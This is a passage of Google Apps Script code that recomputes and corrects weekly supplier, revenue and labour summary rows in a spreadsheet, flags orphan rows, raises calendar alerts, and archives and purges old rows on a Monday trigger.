 * No pull-owned filtering of any kind: a derived row (Bennetts, blank
 * location) is healed like any other; a row structurally unreachable from
 * Suppliers/Revenue (shopify_orderapp's online revenue) is left untouched,
 * not orphaned, because aggregateSupplierRows_ itself never recomputes it.
 *
 * @param {string} week 'YYYY-MM-DD'
 * @param {{archiveWeeks:Object, summaryRows:Array, supplierRows:Array,
 *   revenueRows:Array, summSheet:Sheet, backupSheet:Sheet,
 *   backedUpWeeks:Object, runId:string, extractedAt:string}} ctx built ONCE
 *   by the caller — never per week.
 * @param {boolean} [isNewest] — true only for the newest week in the caller's
 *   batch; escalates a SPLIT-skip/duplicate-refusal alert to high severity.
 * @returns {{week:string, action:string, reason:?string, rowsAdded:number,
 *   rowsUpdated:number, duplicatesSkipped:number,
 *   updates:Array<{key:string,from:number,to:number}>,
 *   orphans:Array<{key:string,supplier:string,location:string,total:number}>,
 *   backedUp:boolean}}
 */
function healWeek_(week, ctx, isNewest) {
  healBackupWeek_(week, ctx);

  var plan = computeHealPlan_([week], ctx)[0];

  if (plan.action === 'skip-split' || plan.action === 'refuse-duplicate-keys') {
    healRaiseAlert_(week,
      plan.action === 'skip-split' ? 'SPLIT week skipped' : 'duplicate keys — refused',
      [plan.reason], !!isNewest, ctx.calendarEventsCache);
    return {
      week: week, action: plan.action, reason: plan.reason,
      rowsAdded: 0, rowsUpdated: 0, duplicatesSkipped: 0, updates: [], orphans: [], backedUp: true
    };
  }

  var weekEnd = addDaysStr_(week, 6);
  var recomputed = aggregateSupplierRows_(ctx.supplierRows, week, weekEnd, 'spend')
    .concat(aggregateSupplierRows_(ctx.revenueRows, week, weekEnd, 'revenue'));
  var normalizedRows = recomputed.map(function (g) {
    return [week, weekEnd, g.supplier, g.location, g.total, ctx.extractedAt, g.department, g.kind];
  });

  var writeRes = upsertRows_(ctx.summSheet, normalizedRows, SUMMARY_KEY_COLS, SUMMARY_TOTAL_COL, SUMMARY_STAMP_COL);

  var computedKeys = {};
  normalizedRows.forEach(function (r) { computedKeys[rowKey_(r, SUMMARY_KEY_COLS)] = true; });
  var orphans = healOrphanCandidates_(week, ctx, computedKeys);

  var alertDetail = [];
  if (writeRes.updates.length > 0) {
    alertDetail.push(writeRes.updates.map(function (u) {
      return u.key + ': ' + u.from + ' -> ' + u.to;
    }).join('\n'));
  }
  if (orphans.length > 0) {
    alertDetail.push('Orphan candidate(s) — stale Summary key(s) with no matching row in ' +
      'this recompute (NOT deleted; review with runSummaryOrphanSweepDryRun()):\n' +
      orphans.map(function (o) { return o.key + ' ($' + o.total + ')'; }).join('\n'));
  }
  if (alertDetail.length > 0) {
    healRaiseAlert_(week,
      writeRes.updates.length > 0 ? 'Summary corrected' : 'orphan candidate(s) found',
      alertDetail, false, ctx.calendarEventsCache);
  }

  // A non-zero duplicatesSkipped on the heal path is a reportable condition,
  // not silence — that silent discard on a money path is exactly what let
  // FIX2's case/whitespace split understate Summary for weeks (REVIEW FIXES
  // 2026-08-26, FIX 3).
  if (writeRes.duplicatesSkipped > 0) {
    Logger.log('healWeek_: week ' + week + ' — duplicatesSkipped=' + writeRes.duplicatesSkipped +
      ' (recomputed row(s) already matched the stored key + amount)');
  }

  return {
    week: week, action: 'heal', reason: null,
    rowsAdded: writeRes.rowsAdded, rowsUpdated: writeRes.rowsUpdated,
    duplicatesSkipped: writeRes.duplicatesSkipped,
    updates: writeRes.updates, orphans: orphans, backedUp: true
  };
}

/**
 * Live Summary rows for `week` that are NOT present in `computedKeys` — a
 * heal that mints a NEW Summary key (a location/supplier/department rename)
 * leaves the OLD key's row behind; upsertRows_ has no delete path, so the
 * stale row survives and doGet serves the money twice (PRD-12, Step 3).
 * Detection only — this never deletes; see runSummaryOrphanSweep (the
 * manual, gated removal half) in summary_audit.gs.
 *
 * shopify_orderapp rows are excluded: they are written directly by the
 * order-app pull (orderapp.gs), have no Suppliers/Revenue backing, and are
 * structurally unreachable from a recompute — they would ALWAYS look like an
 * orphan otherwise. Labour rows are excluded for the same structural reason:
 * labourWeeklyPull_ writes them from an EXTERNAL spreadsheet (LABOUR_SHEET_ID),
 * not from Suppliers/Revenue, and healWeeks_ runs healWeek_ BEFORE
 * labourWeeklyPull_ every run — without this exclusion every week would raise
 * a false orphan alert forever (REVIEW FIXES 2026-08-26, FIX 2). Matching is
 * on the full SUMMARY_KEY_COLS tuple, normalized exactly like rowKey_ — never
 * (week, location) alone, since a blank location is not a safe predicate.
 *
 * Weeks past auditPurgeCutoff_ are skipped: past that line NEITHER tab holds
 * the source rows any more, so a recompute is always empty and every row
 * would misread as an orphan.
 *
 * @param {string} week 'YYYY-MM-DD'
 * @param {{summaryRows:Array, purgeCutoff:string}} ctx purgeCutoff is optional;
 *   if present uses it, otherwise computes from today
 * @param {Object} computedKeys rowKey_-shaped key -> true, this week's fresh recompute
 * @returns {Array<{key:string, supplier:string, location:string, total:number}>}
 */
function healOrphanCandidates_(week, ctx, computedKeys) {
  var purgeCutoff = ctx.purgeCutoff || auditPurgeCutoff_(todayStr_());
  if (week < purgeCutoff) return [];

  var orphans = [];
  for (var i = 1; i < ctx.summaryRows.length; i++) { // row 0 = header
    var row = ctx.summaryRows[i];
    if (coerceDateStr_(row[0]) !== week) continue;
    var supplier = String(row[2]);
    // ONE named list (SUMMARY_HEAL_FOREIGN_SUPPLIERS_), shared with
    // restoreWeekFromHealBackup_'s delete predicate so the two cannot drift.
    if (summaryRowIsHealForeign_(row)) continue;
    var key = rowKey_(row, SUMMARY_KEY_COLS);
    if (computedKeys[key]) continue;
    orphans.push({
      key: key, supplier: supplier, location: String(row[3]),
      total: Number(row[SUMMARY_TOTAL_COL])
    });
  }
  return orphans;
}

/**
 * Shared entry point for both the scheduled run and every override
 * (greenBeanPull_'s up-to-5-per-run override calls included). Builds `ctx`
 * ONCE for the whole batch — a per-week ctx build would add a full
 * `_archive` read (and a Summary snapshot) per week on a path already near
 * the 6-minute GAS ceiling, where a timeout is a partial-ingest event — then
 * processes `weeks` NEWEST-first regardless of input order, so a mid-run
 * death always leaves the most recent weeks done.
 *
 * A refused/skipped NEWEST week is a loud, run-level failure: the current
 * week is what every report and LEIBLE_GM_COST_MONITOR reads, and a silently
 * un-summarized current week is worse than a slightly wrong one. The same
 * failure on an older week is not fatal — only the newest week's success
 * gates `success`.
 *
 * @param {string[]} weeks 'YYYY-MM-DD' week_start strings, any order.
 * @returns {{weeks:Array, success:boolean, newestWeekFailed:boolean}}
 */
function healWeeks_(weeks) {
  var ss = getHubSpreadsheet_();
  var suppSheet = ss.getSheetByName(SUPPLIERS_TAB);
  var archSheet = ensureSheet(ss, ARCHIVE_TAB, SUPPLIERS_HEADERS);
  var summSheet = ensureSheet(ss, SUMMARY_TAB, SUMMARY_HEADERS);
  var revSheet = ensureSheet(ss, REVENUE_TAB, REVENUE_HEADERS);
  var backupSheet = ensureSheet(ss, SUMMARY_HEAL_BACKUP_TAB, SUMMARY_HEAL_BACKUP_HEADERS);

  var archRows = archSheet.getDataRange().getValues().slice(1);
  var archiveWeeks = {};
  archRows.forEach(function (r) {
    var d = coerceDateStr_(r[0]);
    if (DATE_ARG_RE.test(d)) archiveWeeks[weekStartForDate_(d)] = true;
  });

  var backupRows = backupSheet.getDataRange().getValues().slice(1);
  var backedUpWeeks = {};
  backupRows.forEach(function (r) {
    // The same DATE_ARG_RE guard archiveWeeks gets six lines up. backedUpWeeks
    // decides whether a DESTRUCTIVE heal takes its backup first (healWeek_:
    // `if (ctx.backedUpWeeks[week]) return true`), so a blank row or a note
    // somebody typed into the tab has no business entering it.
    var w = coerceDateStr_(r[0]);
    if (DATE_ARG_RE.test(w)) backedUpWeeks[w] = true;
  });

  var nowStamp = Utilities.formatDate(new Date(Date.now()), 'Australia/Sydney', "yyyy-MM-dd'T'HH:mm:ssXXX");
  var today = nowStamp.slice(0, 10);
  var purgeCutoff = auditPurgeCutoff_(today);

  var ctx = {
    archiveWeeks: archiveWeeks,
    summaryRows: summSheet.getDataRange().getValues(),
    supplierRows: suppSheet ? suppSheet.getDataRange().getValues().slice(1) : [],
    revenueRows: revSheet ? revSheet.getDataRange().getValues().slice(1) : [],
    summSheet: summSheet,
    backupSheet: backupSheet,
    backedUpWeeks: backedUpWeeks,
    runId: 'HEAL-' + nowStamp,
    extractedAt: nowStamp,
    purgeCutoff: purgeCutoff,
    // step8 FIX4: one calendar day-read for the whole batch, shared by every
    // healWeek_'s healRaiseAlert_ call — see raiseCalendarAlert_ (staleness.gs).
    calendarEventsCache: stalenessNewEventsCache_()
  };

  var sorted = weeks.slice().sort().reverse(); // 'YYYY-MM-DD' sorts lexically — newest first

  var results = [];
  var newestWeekFailed = false;
  for (var i = 0; i < sorted.length; i++) {
    var isNewest = (i === 0);
    var res = healWeek_(sorted[i], ctx, isNewest);
    results.push(res);
    if (isNewest && (res.action === 'skip-split' || res.action === 'refuse-duplicate-keys')) {
      newestWeekFailed = true;
    }
  }

  return {
    weeks: results, success: !newestWeekFailed, newestWeekFailed: newestWeekFailed,
    // step9 FIX4: exposed so weeklySummarize_impl_'s Labour correction alert
    // (a second, independent Summary write in the SAME batch) can share this
    // run's calendar-events cache instead of paying its own getEventsForDay read.
    calendarEventsCache: ctx.calendarEventsCache
  };
}

function summaryDataToObjects_(values) {
  var headers = values[0];
  var result = [];
  for (var r = 1; r < values.length; r++) {
    var obj = {};
    for (var c = 0; c < headers.length; c++) {
      var val = values[r][c];
      if (val instanceof Date) val = coerceDateStr_(val);
      obj[headers[c]] = val;
    }
    result.push(obj);
  }
  return result;
}

function filterSummaryByDateRange_(rows, from, to) {
  var filtered = [];
  for (var i = 0; i < rows.length; i++) {
    var ws = String(rows[i].week_start);
    if (from && ws < from) continue;
    if (to && ws > to) continue;
    filtered.push(rows[i]);
  }
  return filtered;
}

/* ------------------------------------------------------------------ *
 * Weekly summarize + archive/purge
 * ------------------------------------------------------------------ */

/**
 * Summarize one week into the Summary tab, then archive/purge old Suppliers rows.
 *
 * @param {string} [weekStartOverride] — any 'YYYY-MM-DD' inside the target week;
 *   it is SNAPPED to that week's Monday. Used to summarize a backlog week that
 *   the Monday trigger has already passed by. A non-date arg (e.g. a trigger
 *   event object) falls back to the last completed week.
 */
function weeklySummarize(weekStartOverride) {
  // Entry-point lock (§1c): weeklySummarize is a read-modify-write across
  // Suppliers/Revenue/Summary/_archive. Locking only the inner writes would
  // let a concurrent doPost finish its scan before this holds the lock and
  // still race it — so the whole entry point is wrapped, not the helpers.
  var res = withScriptLock_(function () { return weeklySummarize_impl_(weekStartOverride); });
  if (res === LOCK_TIMEOUT_) {
    Logger.log('weeklySummarize: could not acquire script lock — skipped this run');
    return { refused: 'locked' };
  }
  return res;
}

/**
 * How many weeks a SCHEDULED (no-override) run heals. The kill switch
 * (SUMMARY_HEAL_ENABLED, default OFF/absent) controls ONLY this — every gate
 * in healWeek_ stays active regardless: "off" means "today's single-week
 * behaviour, now guarded", never "gates bypassed".
 */
function summaryHealWindowSize_() {
  var props = PropertiesService.getScriptProperties();
  var enabled = String(props.getProperty('SUMMARY_HEAL_ENABLED') || '').toLowerCase() === 'true';
  // PHASE FREEZE: the multi-week window is the frozen half. Clamped HERE, not
  // at the write site, so previewSummaryHeal (which sizes off this same
  // function) can never diverge from what the real run actually heals.
  if (SUMMARY_HEAL_FROZEN_) {
    if (enabled) {
      Logger.log('summaryHealWindowSize_: SUMMARY_HEAL_ENABLED=true IGNORED — ' + SUMMARY_HEAL_FROZEN_MSG_ +
        ' Window clamped to 1 (the pre-phase single-week behaviour).');
    }
    return 1;
  }
  if (!enabled) return 1;
  var n = Number(props.getProperty('SUMMARY_HEAL_WEEKS'));
  return (isFinite(n) && n > 0) ? Math.floor(n) : SUMMARY_HEAL_WEEKS_;
}

function weeklySummarize_impl_(weekStartOverride) {
  var ss = getHubSpreadsheet_();
  var suppSheet = ss.getSheetByName(SUPPLIERS_TAB);
  if (!suppSheet) { Logger.log('weeklySummarize: no Suppliers tab'); return; }

  var summSheet = ensureSheet(ss, SUMMARY_TAB, SUMMARY_HEADERS);
  ensureSheet(ss, ARCHIVE_TAB, SUPPLIERS_HEADERS);
  ensureSheet(ss, REVENUE_TAB, REVENUE_HEADERS);
  ensureSheet(ss, SUMMARY_HEAL_BACKUP_TAB, SUMMARY_HEAL_BACKUP_HEADERS);

  var today = todayStr_();                              // KEEP: still used for cutoffDate below
  var ovr = resolveDateArg_(weekStartOverride, null);   // trigger-event safe
  var weeks;
  if (ovr) {
    // Snap to Monday: an unsnapped week_start writes Summary rows that overlap
    // the trigger's Monday-aligned rows -> filterSummaryByDateRange_ returns both
    // -> double-counted spend. Dedup keys on week_start, so it would NOT save us.
    var start = weekStartForDate_(ovr);
    var weekEnd = addDaysStr_(start, 6);

    // Refuse a week that hasn't finished yet. Summary now upserts (§1h), so a
    // re-summarize CAN correct a frozen partial total in principle — but a
    // partial week written to Summary is indistinguishable from a final one to
    // any consumer of doGet in the meantime, and nothing guarantees a
    // re-summarize ever happens before that partial figure is read/reported
    // on. Only a completed week may be summarized.
    if (weekEnd >= today) {
      Logger.log('weeklySummarize: REFUSED incomplete week ' + start + ' … ' + weekEnd +
        ' (today=' + today + ') — a partial total would be frozen by dedup. ' +
        'Re-run once the week has ended.');
      return {
        weekStart: start, weekEnd: weekEnd,
        refused: 'incomplete-week',
        summariesAdded: 0, labourTabAdded: 0, labourSummaryAdded: 0
      };
    }

    Logger.log('weeklySummarize: override ' + ovr + ' → week ' + start + ' … ' + weekEnd);
    weeks = [start];
  } else {
    var windowSize = summaryHealWindowSize_();
    var last = getLastCompletedWeek_(today);
    weeks = [];
    for (var i = 0; i < windowSize; i++) weeks.push(addDaysStr_(last.start, -7 * i));
  }

  // The ONE guarded write path — backup, SPLIT guard, duplicate-key refusal,
  // upsert, correction alert — shared by the scheduled run and this override
  // alike (Code.gs: healWeeks_/healWeek_).
  var healRes = healWeeks_(weeks);

  // Labour is a second, independent write against Summary (its own source,
  // its own upsert). It respects the same guard: only weeks healWeeks_
  // actually healed (never a SPLIT/refused one — the guard means "write
  // nothing", full stop) are eligible, and the source is read once for the
  // whole batch, not once per week.
  var extractedAt = Utilities.formatDate(new Date(Date.now()), 'Australia/Sydney', "yyyy-MM-dd'T'HH:mm:ssXXX");
  var labourWeeks = [];
  healRes.weeks.forEach(function (w) {
    if (w.action === 'heal') labourWeeks.push({ start: w.week, end: addDaysStr_(w.week, 6) });
  });
  var labourResult = { labourAdded: 0, summaryAdded: 0, summaryUpdated: 0 };
  if (labourWeeks.length > 0) {
    labourResult = labourWeeklyPull_(labourWeeks, ss, summSheet, extractedAt);
    if (labourResult.summaryUpdated > 0) {
      // Calendar alerts dedup on the EXACT title, so a title must be bounded
      // and stable. This one was built from the JOINED healed-week list: it
      // grew with the heal window and re-alerted for the same condition
      // whenever the week set shifted. Invisible while the window was clamped
      // to 1 — which is precisely why it is unfreeze work. Anchor on the
      // newest healed week (labourWeeks is newest-first, inherited from
      // healRes.weeks) plus a count; the full list costs nothing in the body.
      var labourWeekList = labourWeeks.map(function (w) { return w.start; });
      healRaiseAlert_(labourWeekList[0],
        'Labour correction (' + labourWeekList.length +
          ' week' + (labourWeekList.length === 1 ? '' : 's') + ')',
        ['weeks: ' + labourWeekList.join(', '),
         'labourAdded=' + labourResult.labourAdded + ' summaryAdded=' + labourResult.summaryAdded +
         ' summaryUpdated=' + labourResult.summaryUpdated], false, healRes.calendarEventsCache);
    }
  }

  var cutoffDate = new Date(today + 'T12:00:00Z');
  cutoffDate.setUTCDate(cutoffDate.getUTCDate() - ARCHIVE_RETENTION_DAYS);
  var cutoffStr = cutoffDate.toISOString().slice(0, 10);

  // Archive/purge is weekly MAINTENANCE and belongs to the scheduled run only.
  // On an override (backlog) run it would purge the very Suppliers rows just
  // summarized — and since a re-run then reads an empty source, it would report
  // summariesAdded:0, which reads as "already done" but actually means "the
  // source data is gone". Manual backfills must be repeatable. Runs exactly
  // once per scheduled run, never once per healed week.
  if (!ovr) {
    var archSheet = ss.getSheetByName(ARCHIVE_TAB);
    archiveAndPurge_(suppSheet, archSheet, cutoffStr);
  } else {
    Logger.log('weeklySummarize: override run — skipping archive/purge (maintenance is the trigger\'s job)');
  }

  // A single-week run (every override, and a scheduled run with the kill
  // switch off) keeps the pre-existing flat return shape — callers
  // (greenBeanPull_, the older test suite) depend on weekStart/weekEnd/
  // summariesAdded/summariesUpdated/labourTabAdded/labourSummaryAdded/
  // refused living at the top level, not nested under `weeks`.
  if (weeks.length === 1) {
    var wk = healRes.weeks[0];
    var wkEnd = addDaysStr_(wk.week, 6);
    if (wk.action !== 'heal') {
      return {
        weekStart: wk.week, weekEnd: wkEnd,
        refused: wk.action,
        summariesAdded: 0, summariesUpdated: 0, labourTabAdded: 0, labourSummaryAdded: 0
      };
    }
    Logger.log('weeklySummarize: week ' + wk.week + ' → ' + wkEnd +
      ', supplierSummariesAdded=' + wk.rowsAdded +
      ', supplierSummariesUpdated=' + wk.rowsUpdated +
      ', labourTabAdded=' + labourResult.labourAdded +
      ', labourSummaryAdded=' + labourResult.summaryAdded +
      ', cutoff=' + cutoffStr);
    return {
      weekStart: wk.week, weekEnd: wkEnd,
      summariesAdded: wk.rowsAdded,
      summariesUpdated: wk.rowsUpdated,
      labourTabAdded: labourResult.labourAdded,
      labourSummaryAdded: labourResult.summaryAdded
    };
  }

  Logger.log('weeklySummarize: healed ' +
    healRes.weeks.map(function (w) { return w.week + ':' + w.action; }).join(', ') +
    ', success=' + healRes.success + ', cutoff=' + cutoffStr);

  // The multi-week shape is a strict SUPERSET of the single-week one above.
  // It used to be a DIFFERENT shape — no `refused`, no counters — so a caller
  // could not tell a fully-refused multi-week run from a successful one, and
  // any completion test written as `!res.refused` (greenBeanPull_) read it as
  // success and dropped the week from its resum queue. A caller must never
  // have to know which window size produced its result.
  var out = {
    weeks: healRes.weeks,
    success: healRes.success,
    newestWeekFailed: healRes.newestWeekFailed,
    weekStart: healRes.weeks[0].week,
    weekEnd: addDaysStr_(healRes.weeks[0].week, 6),
    summariesAdded: healRes.weeks.reduce(function (n, w) { return n + (w.rowsAdded || 0); }, 0),
    summariesUpdated: healRes.weeks.reduce(function (n, w) { return n + (w.rowsUpdated || 0); }, 0),
    labourTabAdded: labourResult.labourAdded,
    labourSummaryAdded: labourResult.summaryAdded
  };
  // `refused` appears iff ZERO weeks healed. A PARTIAL heal is real work and
  // must NOT be reported as a refusal — a caller would discard a week that
  // genuinely completed. The value is the NEWEST week's action (healWeeks_
  // returns newest-first), so it means exactly what it means single-week.
  if (healRes.weeks.every(function (w) { return w.action !== 'heal'; })) {
    out.refused = healRes.weeks[0].action;
  }
  return out;
}

function archiveAndPurge_(sourceSheet, archiveSheet, cutoffDateStr) {
  var data = sourceSheet.getDataRange().getValues();
  var archived = 0;
  var alreadyArchived = 0;

  /* `_archive` has no dedup of its own, and appendRow always appends. So an
   * invoice that was re-ingested into Suppliers after being purged gained
   * ANOTHER archive copy on the next run — and another, every cycle. By
   * 2026-08-25 nine weeks held six copies each of the same invoices, and any
   * reader summing Suppliers + _archive over-counted by $20,624.23.
   *
   * The re-ingest that starts the cycle is fixed in ingestSupplierRows, but
   * this is the step that MULTIPLIES it, so it guards too: purge the Suppliers
   * row either way, only append when the archive does not already hold it. */
  var archivedKeys = buildKeySet_(archiveSheet, SUPPLIERS_KEY_COLS);

  /* This used to appendRow + deleteRow PER ROW. Measured at 172 s for 484 rows
   * (~0.36 s/row) against the 360 s ceiling, which is why every SCHEDULED
   * weeklySummarize failed — and self-reinforcing, because a timeout leaves the
   * backlog for the next run to grow. It only ever ran on scheduled runs
   * (`if (!ovr)`), so manual overrides always looked healthy. Now: ONE decision
   * pass, ONE setValues, and one deleteRows per contiguous run — O(1) API calls
   * in the common case instead of O(n).
   *
   * Iterating BOTTOM-UP is load-bearing twice over: it preserves the existing
   * _archive row order (asserted by the archiveAndPurge_ test), and it yields
   * row indices already in descending order, so contiguous runs collapse
   * directly and deleting from the bottom keeps every lower index valid. */
  var numCols = data[0].length;
  var toArchive = [];
  var toDelete = [];

  for (var r = data.length - 1; r >= 1; r--) {
    var rowDate = coerceDateStr_(data[r][0]);
    // A blank date coerces to '' and '' <= any cutoff is TRUE, which would
    // archive+purge every blank row. Only ever act on a real calendar date.
    if (!DATE_ARG_RE.test(rowDate)) continue;
    if (rowDate <= cutoffDateStr) {
      var key = rowKey_(data[r], SUPPLIERS_KEY_COLS);
      if (key !== '||' && archivedKeys[key] === true) {
        alreadyArchived++;                 // already preserved — do not duplicate it
      } else {
        // Pad to the header width: setValues demands a strict rectangle, where
        // appendRow tolerated a short row.
        var out = data[r].slice();
        while (out.length < numCols) out.push('');
        toArchive.push(out);
        if (key !== '||') archivedKeys[key] = true;   // guard within this run too
        archived++;
      }
      toDelete.push(r + 1);                // 1-indexed sheet row, descending
    }
  }

  // Guard the empty batch: real GAS rejects a zero-height getRange outright.
  if (toArchive.length) {
    archiveSheet
      .getRange(archiveSheet.getLastRow() + 1, 1, toArchive.length, numCols)
      .setValues(sheetSafeBlock_(toArchive));
  }

  // toDelete is descending; collapse each contiguous run into one deleteRows.
  for (var i = 0; i < toDelete.length;) {
    var end = toDelete[i];                 // highest row in this run
    var j = i;
    while (j + 1 < toDelete.length && toDelete[j + 1] === toDelete[j] - 1) j++;
    var start = toDelete[j];               // lowest row in this run
    sourceSheet.deleteRows(start, end - start + 1);
    i = j + 1;
  }

  Logger.log('archiveAndPurge_: archived=' + archived +
    ' alreadyInArchive=' + alreadyArchived +
    ' rows older than ' + cutoffDateStr);
  return archived;
}

function installWeeklySummarizeTrigger() {
  var triggers = ScriptApp.getProjectTriggers();
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'weeklySummarize') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
  ScriptApp.newTrigger('weeklySummarize')
    .timeBased()
    .onWeekDay(ScriptApp.WeekDay.MONDAY)
    .atHour(4)
    .inTimezone('Australia/Sydney')
    .create();
  Logger.log('installWeeklySummarizeTrigger: Monday 4am Australia/Sydney trigger installed');
}

/* ------------------------------------------------------------------ *
 * JSON output helper
 * ------------------------------------------------------------------ */

function jsonOut_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
